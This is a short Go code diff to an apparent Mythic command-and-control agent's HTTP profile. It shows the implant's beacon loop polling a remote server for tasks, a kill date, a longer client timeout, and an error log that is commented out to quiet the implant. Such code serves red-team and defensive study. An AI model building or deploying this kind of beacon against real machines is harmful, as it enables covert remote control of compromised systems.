@@ -68,10 +68,8 @@ type C2Default struct {
 	Killdate          time.Time
 }
 
-// New creates a new HTTP C2 profile from the package's global variables and returns it
 func New() structs.Profile {
 
-	//fmt.Printf("final url: %s\n", final_url)
 	killDateString := fmt.Sprintf("%sT00:00:00.000Z", killdate)
 	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
 	if err != nil {
@@ -127,7 +125,7 @@ func (c *C2Default) Start() {
 						//fmt.Printf("Raw resp: \n %s\n", string(resp))
 						taskResp := structs.MythicMessageResponse{}
 						if err := json.Unmarshal(resp, &taskResp); err != nil {
-							log.Printf("Error unmarshal response to task response: %s", err.Error())
+							//log.Printf("Error unmarshal response to task response: %s", err.Error())
 							time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 							continue
 						}
@@ -276,7 +274,7 @@ var tr = &http.Transport{
 	//IdleConnTimeout: 1 * time.Nanosecond,
 }
 var client = &http.Client{
-	Timeout:   5 * time.Second,
+	Timeout:   90 * time.Second,
 	Transport: tr,
 }
 
@@ -371,7 +369,6 @@ func (c *C2Default) htmlPostData(sendData []byte) []byte {
 			} else {
 				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 			}
-			
 
 			title, body, err = c.get_message_content(base_url, token, msg_id)
 			if err != nil {
@@ -383,7 +380,7 @@ func (c *C2Default) htmlPostData(sendData []byte) []byte {
 				break
 			}
 		}
-		
+
 		// Failed to get tasking
 		if title != "TASK" {
 			continue
